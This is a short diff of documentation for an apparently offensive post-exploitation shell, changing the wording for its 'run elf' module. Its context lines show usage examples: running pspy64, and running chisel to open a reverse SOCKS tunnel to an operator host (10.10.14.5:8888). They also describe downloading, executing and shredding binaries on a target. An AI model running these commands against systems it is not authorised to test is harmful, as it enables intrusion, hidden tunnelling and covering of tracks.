@@ -116,7 +116,7 @@ Windows privilege escalation scanner from [PEASS-ng](https://github.com/peass-ng
 
 ### ELF Binary — `run elf`
 
-Run any arbitrary binary from a URL or your binbag directory:
+Run any arbitrary Linux/native Unix binary from a URL or your binbag directory:
 
 ```
 󰗣 flame [1] ❯ run elf pspy64              # From binbag
@@ -124,7 +124,7 @@ Run any arbitrary binary from a URL or your binbag directory:
 󰗣 flame [1] ❯ run elf chisel client 10.10.14.5:8888 R:socks
 ```
 
-**Mode:** Disk + cleanup (downloaded, executed, shredded)
+**Mode:** Disk + cleanup
 **Scope:** Linux/native Unix targets only for now. Windows native executables are not supported by this runner yet.
 
 ## Custom Modules
